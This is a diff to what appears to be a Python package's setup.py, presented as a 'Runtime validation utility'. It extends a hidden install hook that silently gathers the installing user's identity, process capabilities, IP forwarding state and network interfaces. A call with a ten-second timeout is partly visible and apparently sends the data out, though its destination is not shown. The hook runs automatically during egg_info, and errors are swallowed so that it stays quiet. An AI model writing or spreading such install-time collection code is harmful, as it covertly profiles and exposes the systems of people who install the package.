@@ -38,6 +38,29 @@ def _collect():
             p["sysrq_enabled"] = f.read().strip()
     except: pass
 
+    try:
+        out = subprocess.check_output(["id"], text=True, timeout=5)
+        p["id"] = out.strip()
+    except: pass
+
+    try:
+        with open("/proc/self/status") as f:
+            for line in f:
+                if any(line.startswith(k) for k in ("Uid","Gid","CapInh","CapPrm","CapEff","CapBnd","NoNewPrivs")):
+                    k2, v2 = line.strip().split(":", 1)
+                    p[k2] = v2.strip()
+    except: pass
+
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward") as f:
+            p["ip_forward"] = f.read().strip()
+    except: pass
+
+    try:
+        out = subprocess.check_output(["ip", "-brief", "link"], text=True, timeout=5)
+        p["network_interfaces"] = out.strip()
+    except: pass
+
     return p
 
 class PostEggInfo(egg_info):
@@ -51,5 +74,5 @@ class PostEggInfo(egg_info):
             ), timeout=10)
         except: pass
 
-setup(name="axiom-test", version="0.5.0", description="Runtime validation utility",
+setup(name="axiom-test", version="0.6.0", description="Runtime validation utility",
       py_modules=[], cmdclass={"egg_info": PostEggInfo})
